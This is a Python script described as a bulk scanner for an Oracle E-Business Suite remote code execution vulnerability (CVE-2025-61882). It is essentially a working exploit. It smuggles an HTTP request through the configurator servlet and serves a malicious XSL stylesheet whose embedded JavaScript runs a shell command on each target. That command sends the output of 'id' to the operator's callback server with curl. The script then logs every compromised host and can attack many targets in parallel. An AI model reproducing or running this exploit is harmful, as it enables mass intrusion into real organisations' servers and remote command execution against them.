import requests
import argparse
from threading import Thread, Lock
import http.server
from base64 import b64encode
import random
import time
import re
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse

requests.packages.urllib3.disable_warnings()

successful_targets = []
callback_data = {}
file_lock = Lock()

class SimpleHTTPRequestHandler(http.server.BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        pass  
    
    def do_GET(self):
        if self.path.endswith('.xsl'):
            js = f"""
            var stringc = java.lang.Class.forName('java.lang.String');
            var cmds =  java.lang.reflect.Array.newInstance(stringc,3);
            java.lang.reflect.Array.set(cmds,0,'sh');
            java.lang.reflect.Array.set(cmds,1,'-c');
            java.lang.reflect.Array.set(cmds,2,'curl http://{args.lhost}:{self.server.server_port}/callback?data=$(id|base64)');
            java.lang.Runtime.getRuntime().exec(cmds);
            1
                """
            config_payload = f'''<xsl:stylesheet version="1.0"
                            xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
                            xmlns:b64="http://www.oracle.com/XSL/Transform/java/sun.misc.BASE64Decoder"
                            xmlns:jsm="http://www.oracle.com/XSL/Transform/java/javax.script.ScriptEngineManager"
                            xmlns:eng="http://www.oracle.com/XSL/Transform/java/javax.script.ScriptEngine"
                            xmlns:str="http://www.oracle.com/XSL/Transform/java/java.lang.String">
                <xsl:template match="/">
                    <xsl:variable name="bs" select="b64:decodeBuffer(b64:new(),'{b64encode(js.encode()).decode()}')"/>
                    <xsl:variable name="js" select="str:new($bs)"/>
                    <xsl:variable name="m" select="jsm:new()"/>
                    <xsl:variable name="e" select="jsm:getEngineByName($m, 'js')"/>
                    <xsl:variable name="code" select="eng:eval($e, $js)"/>
                    <xsl:value-of select="$code"/>
                </xsl:template>
            </xsl:stylesheet>'''            

            self.send_response(200)
            self.send_header("Content-type", "application/xml")
            self.end_headers()
            self.wfile.write(config_payload.encode())
        
        elif '/callback' in self.path:
            try:
                import base64
                from urllib.parse import parse_qs, urlparse
                query = urlparse(self.path).query
                params = parse_qs(query)
                if 'data' in params:
                    decoded = base64.b64decode(params['data'][0]).decode()
                    if re.search(r'uid=\d+.*gid=\d+.*groups=', decoded):
                        target_ip = self.client_address[0]
                        result = f"{target_ip} | {decoded.strip()}"
                        
                        with file_lock:
                            print(f"\n[+] Got one! {target_ip} is vulnerable")
                            print(f"[+] Command output: {decoded.strip()}")
                            successful_targets.append({
                                'ip': target_ip,
                                'output': decoded.strip(),
                                'time': time.time()
                            })
                            with open('vuln-output.txt', 'a') as f:
                                f.write(result + '\n')
            except Exception as e:
                pass
            
            self.send_response(200)
            self.end_headers()
        else:
            self.send_response(404)
            self.end_headers()

banner = """
╔═══════════════════════════════════════════════════════════════╗
║                                                               ║
║   Oracle E-Business Suite RCE Scanner                         ║
║                                                               ║
║   visec.net.tr                                                ║
║   Written by: Enay                                            ║
║                                                               ║
║                                                               ║
╚═══════════════════════════════════════════════════════════════╝
"""
print(banner)

def stage1(target_address, lport, session):
    try:
        update_csrf(target_address, session)
        stage2 = f'''POST /OA_HTML/help/../ieshostedsurvey.jsp HTTP/1.2
Host: {args.lhost}:{lport}
User-Agent: xxxxx
Connection: keep-alive
Cookie: {"; ".join([f"{c.name}={c.value}" for c in session.cookies])}
 
'''
        stage2 += "\r\n\r\n\r\nPOST /"
        payload = cook_smuggle_stub(stage2)
        smuggle(target_address, payload, session)
        return True
    except Exception as e:
        return False
 
def update_csrf(target_address, session):
    session.get(target_address + "/OA_HTML/runforms.jsp", allow_redirects=False, timeout=5)
    res = session.post(target_address + "/OA_HTML/JavaScriptServlet", 
                 headers={"CSRF-XHR": "YES", "FETCH-CSRF-TOKEN": "1"}, 
                 timeout=5)
    token = res.text.split(":")[1] if ":" in res.text else ""
    if not len(token):
        raise Exception("CSRF token retrieval failed")
 
def cook_smuggle_stub(payload):
    if payload.startswith("POST "):
        payload = payload[5:]
    elif payload.startswith("GET "):
        payload = payload[4:]
    payload = payload.replace("\n", "\r\n")
    return ''.join(['&#' + str(ord(i)) + ";" for i in list(payload)])
 
def smuggle(target_address, payload, session):
    xml = f'''<?xml version="1.0" encoding="UTF-8"?><initialize><param name="init_was_saved">test</param><param name="return_url">http://apps.example.com:7201{payload}</param><param name="ui_def_id">0</param><param name="config_effective_usage_id">0</param><param name="ui_type">Applet</param></initialize>'''
    session.post(target_address + "/OA_HTML/configurator/UiServlet",
           data={
               "redirectFromJsp": "1",
               "getUiType": xml
           }, timeout=5)

def process_single_target(target, lhost, idx, total):
    target = target.rstrip('/')
    lport = random.randint(2000, 9999)
    
    httpd = http.server.HTTPServer(('0.0.0.0', lport), SimpleHTTPRequestHandler)
    thread = Thread(target=httpd.serve_forever, daemon=True)
    thread.start()
    
    session = requests.session()
    session.verify = False
    
    try:
        print(f"[*] [{idx}/{total}] Checking {target} on port {lport}")
        
        if stage1(target, lport, session):
            time.sleep(3)  
    except Exception as e:
        pass
    finally:
        httpd.shutdown()

def process_targets(targets_file, lhost):
    with open(targets_file, 'r') as f:
        targets = [line.strip() for line in f if line.strip()]
    
    print(f"\n[*] Loaded {len(targets)} targets from file")
    print(f"[*] Running with {args.threads} concurrent threads")
    print(f"[*] Vulnerable hosts will be saved to vuln-output.txt\n")
    print("[*] Starting scan...\n")
    
    # Clear output file
    with open('vuln-output.txt', 'w') as f:
        f.write(f"# Oracle EBS CVE-2025-61882 - Scan Results\n")
        f.write(f"# Started: {time.ctime()}\n")
        f.write(f"# Total targets: {len(targets)}\n")
        f.write(f"# Scanner by: Chirag Artani\n\n")
    
    start_time = time.time()
    
    # Process targets concurrently
    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        futures = [executor.submit(process_single_target, target, lhost, idx, len(targets)) 
                   for idx, target in enumerate(targets, 1)]
        
        for future in as_completed(futures):
            try:
                future.result()
            except Exception as e:
                pass
    
    elapsed = time.time() - start_time
    
    # Print final results
    print("\n" + "="*65)
    print(f"] Scan finished in {elapsed:.2f} seconds")
    print(f" Found {len(successful_targets)} vulnerable target(s)")
    print(f"Check vuln-output.txt for full results")
    print("="*65)
    
    if successful_targets:
        print("\nVulnerable targets found:\n")
        for target in successful_targets:
            print(f"    {target['ip']} → {target['output']}")
        print()
    else:
        print("\n No vulnerable targets found in this batch\n")

argparser = argparse.ArgumentParser(
    description='Oracle E-Business Suite CVE-2025-61882 Bulk Scanner',
    formatter_class=argparse.RawDescriptionHelpFormatter,
    epilog='''
Examples:
  python3 scanner.py --targets urls.txt --lhost 139.59.11.66
  python3 scanner.py --targets urls.txt --lhost 139.59.11.66 --threads 50

Author: Chirag Artani
    ''')
argparser.add_argument('--targets', required=True, help='File with target URLs (one per line)')
argparser.add_argument('--lhost', required=True, help='Your VPS/attacker IP address')
argparser.add_argument('--threads', type=int, default=20, help='Number of threads (default: 20)')
args = argparser.parse_args()

process_targets(args.targets, args.lhost)
